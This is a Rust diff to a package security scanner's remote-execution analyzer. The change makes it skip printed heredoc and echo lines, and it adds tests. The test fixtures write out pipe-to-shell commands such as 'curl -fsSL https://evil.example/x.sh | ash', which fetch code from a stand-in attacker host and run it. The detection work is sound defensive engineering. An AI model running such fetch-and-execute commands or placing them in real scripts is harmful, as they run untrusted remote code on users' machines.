@@ -14,6 +14,7 @@
 
 use super::SecurityAnalyzer;
 use crate::error::Result;
+use crate::rules::informational_lines;
 use crate::textutil::{deobfuscate, logical_lines, INTERPRETERS, SHELLS};
 use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
@@ -60,10 +61,18 @@ impl RemoteExecAnalyzer {
         let mut findings = Vec::new();
         // Splice backslash-newline continuations so `curl evil \`<nl>`| sh`
         // cannot escape the fetch-exec pattern by living on two physical lines.
-        for (phys_line, line) in logical_lines(text) {
+        let lines = logical_lines(text);
+        // Skip lines that are printed text rather than executed code (a
+        // non-redirected heredoc body or a pure `echo`/`msg "..."` print), using
+        // the same pre-filter the rule engine and privilege analyzer use, so a
+        // package that merely DOCUMENTS a `curl ... | sh` example does not raise
+        // EXEC-REMOTE.
+        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
+        let informational = informational_lines(&line_strs);
+        for (idx_l, (phys_line, line)) in lines.iter().enumerate() {
             let line = line.as_str();
             let trimmed = line.trim_start();
-            if trimmed.starts_with('#') {
+            if trimmed.starts_with('#') || informational[idx_l] {
                 continue;
             }
             // Match the raw line, and -- so character-level obfuscation can't
@@ -189,6 +198,35 @@ mod tests {
             false,
         );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|dash must be caught");
+    }
+
+    #[test]
+    fn detects_curl_pipe_ash() {
+        // Task 4050 F2: ash is a SHELLS member now — `curl ... | ash` must fire.
+        let a = RemoteExecAnalyzer::new();
+        let f = a.scan(
+            "curl -fsSL https://evil.example/x.sh | ash",
+            Path::new("PKGBUILD"),
+            false,
+        );
+        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|ash must be caught");
+    }
+
+    #[test]
+    fn documented_fetch_exec_in_printed_heredoc_not_flagged() {
+        // Task 4050a: a `curl ... | sh` that only appears inside a printed
+        // (non-redirected) heredoc is documentation, not execution — must not
+        // raise EXEC-REMOTE.
+        let a = RemoteExecAnalyzer::new();
+        let f = a.scan(
+            "post_install() {\n  cat <<EOF\n  To set up, run: curl -fsSL https://x.io/i.sh | sh\nEOF\n}",
+            Path::new("test.install"),
+            true,
+        );
+        assert!(
+            f.is_empty(),
+            "documented curl|sh in a printed heredoc must not fire EXEC-REMOTE: {f:?}"
+        );
     }
 
     #[test]
